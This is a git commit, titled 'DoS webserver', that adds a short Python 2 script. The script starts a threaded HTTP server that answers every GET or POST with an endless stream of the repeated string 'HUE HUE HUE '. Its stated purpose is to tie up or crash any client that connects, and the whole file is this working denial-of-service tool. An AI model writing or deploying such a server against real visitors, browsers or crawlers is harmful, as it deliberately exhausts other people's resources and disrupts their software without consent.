bb49783f414525415a2f2f3d3a73acd1ad8099ae
Nick Tzaperas <nick@nijotz.com>
2013-09-06 16:07:48 -0700

    DoS webserver

---
+++ infinte_html.py
@@ -0,0 +1,31 @@
+#!/usr/bin/env python
+
+from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
+from SocketServer import ThreadingMixIn
+
+
+class ThreadingServer(ThreadingMixIn, HTTPServer):
+    pass
+
+
+class InfiniteGarbage(BaseHTTPRequestHandler):
+    def _garbage(self):
+        self.send_response(200)
+        self.send_header('Content-Type', 'text/html')
+        self.end_headers()
+        garbage = 'HUE HUE HUE '
+        while True:
+            self.wfile.write(garbage)
+
+    def do_GET(self):
+        self._garbage()
+
+    def do_POST(self):
+        self._garbage()
+
+if __name__ == '__main__':
+    try:
+        gahbage = ThreadingServer(('', 8080), InfiniteGarbage)
+        gahbage.serve_forever()
+    except:
+        gahbage.socket.close()
